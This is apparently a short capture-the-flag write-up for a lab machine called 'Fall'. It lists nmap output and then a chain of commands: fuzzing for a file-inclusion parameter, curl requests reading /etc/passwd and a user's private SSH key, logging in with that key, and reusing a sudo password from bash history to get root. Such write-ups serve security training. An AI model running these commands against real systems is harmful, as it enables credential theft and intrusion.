----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Fall
# 28/12/2022

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT     STATE  SERVICE     VERSION
22/tcp   open   ssh         OpenSSH 7.8 (protocol 2.0)
80/tcp   open   http        Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
111/tcp  closed rpcbind
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
443/tcp  open   ssl/http    Apache httpd 2.4.39 ((Fedora) OpenSSL/1.1.0i-fips mod_perl/2.0.10 Perl/v5.26.3)
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
3306/tcp open   mysql       MySQL (unauthorized)
8000/tcp closed http-alt
8080/tcp closed http-proxy
8443/tcp closed https-alt
9090/tcp open   http        Cockpit web service 162 - 188


----------------------------------------------------
exploitation
----------------------------------------------------

ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'http://192.168.1.7/test.php?FUZZ=/etc/passwd' -fs 80

curl http://192.168.1.7/test.php?file=/etc/passwd

curl http://192.168.1.7/test.php?file=/home/qiu/.ssh/id_rsa

ssh -i id_rsa qiu@10.0.2.23     
cat .bash_history
echo "remarkablyawesomE" | sudo -S dnf update

sudo su
remarkablyawesomE

----------------------------------------------------
Flag
----------------------------------------------------
[root@FALL ~]# cat proof.txt 
Congrats on a root shell! :-)
